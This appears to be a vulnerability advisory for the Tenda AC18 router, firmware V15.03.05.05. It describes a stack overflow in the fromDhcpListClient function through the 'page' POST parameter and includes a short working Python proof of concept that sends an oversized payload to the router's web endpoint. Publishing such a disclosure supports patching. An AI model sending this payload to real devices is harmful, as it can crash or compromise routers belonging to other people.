## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromDhcpListClient` function. The `v11` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v11` can trigger this security vulnerability.

![image-20240305235042176](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305235042176.png)

![image-20240305235054221](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305235054221.png)

![image-20240305211125463](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305211125463.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DhcpListClient"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305234623581](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305234623581.png)
